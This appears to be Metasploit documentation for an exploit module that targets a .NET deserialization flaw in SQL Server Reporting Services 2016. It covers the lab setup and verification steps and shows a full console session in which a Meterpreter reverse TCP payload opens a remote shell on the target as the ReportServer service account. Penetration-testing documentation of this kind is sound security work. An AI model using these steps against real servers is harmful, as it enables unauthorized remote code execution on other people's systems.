## Vulnerable Application

This module exploits a .NET serialization vulnerability in the SQL Server
Reporting Services web application. The vulnerability exists within the a class
that will load serialized data submitted in a POST request. When processed this
data can lead to code execution within the context of the application which by
default is a service account.

An account is necessary in order to leverage this vulnerability. The request is
submitted using NTLM basic authentication. This account must be assigned at
least the "Browser" role on the site. This is the lowest privilege available and
simply allows the user to view folders, reports and subscribe to reports. To
authenticate as a domain user, set the `DOMAIN` option.

### Service Installation And Setup

Setting up a vulnerable environment for testing is best done by using a SQL
Server 2016 installation ISO which includes an offline installer for SSRS. Later
versions of SQL Server installation ISOs link to an online installer which will
install the patched version automatically.

When installing SQL Server 2016:

  1. Select "New SQL Server stand-alone installation or add features to an
    existing installation"
  1. Later in the "Feature Selection" section, select "Reporting Services -
    Native" under the "Instance Features" group
  1. Proceed with the remainder of the installation per usual

After the server has been installed, it must be configured using the "Reporting
Services Configuration Manager" application. Ensure a database is selected and
created, that both the Web Services URL and Web Portal URLs are activated.
Finally, from the web interface, add accounts and privileges as desired.
Individual accounts can have privileges added by selecting "Manage Folder" and
adding them from this dashboard. **Do not use privileges dashboard available
from "Site Settings" to add the necessary privileges.**

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use exploit/windows/http/ssrs_navcorrector_viewstate`
  4. Set the `RHOSTS`, `USERNAME` and `PASSWORD` options
  5. Do: `run`
  6. You should get a shell.

## Scenarios

### SSRS 2016 on Server 2012 x64

    msf5 > use exploit/windows/http/ssrs_navcorrector_viewstate 
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > set RHOSTS 192.168.159.141
    RHOSTS => 192.168.159.141
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > set USERNAME jdoe
    USERNAME => jdoe
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > set DOMAIN msflab.local
    DOMAIN => msflab.local
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > set PASSWORD Password1
    PASSWORD => Password1
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    PAYLOAD => windows/x64/meterpreter/reverse_tcp
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > set LHOST 192.168.159.128 
    LHOST => 192.168.159.128
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > check
    [*] 192.168.159.141:80 - The service is running, but could not be validated.
    msf5 exploit(windows/http/ssrs_navcorrector_viewstate) > exploit
    
    [*] Started reverse TCP handler on 192.168.159.128:4444 
    [*] Command Stager progress -  24.99% done (2999/12002 bytes)
    [*] Command Stager progress -  49.98% done (5998/12002 bytes)
    [*] Command Stager progress -  74.96% done (8997/12002 bytes)
    [*] Sending stage (206403 bytes) to 192.168.159.141
    [*] Meterpreter session 3 opened (192.168.159.128:4444 -> 192.168.159.141:50376) at 2020-03-06 16:19:24 -0500
    [*] Command Stager progress -  99.83% done (11982/12002 bytes)
    [*] Command Stager progress - 100.00% done (12002/12002 bytes)
    
    meterpreter > getuid
    Server username: NT Service\ReportServer
    meterpreter > sysinfo
    Computer        : SERVER2012
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : MSFLAB
    Logged On Users : 10
    Meterpreter     : x64/windows
    meterpreter >
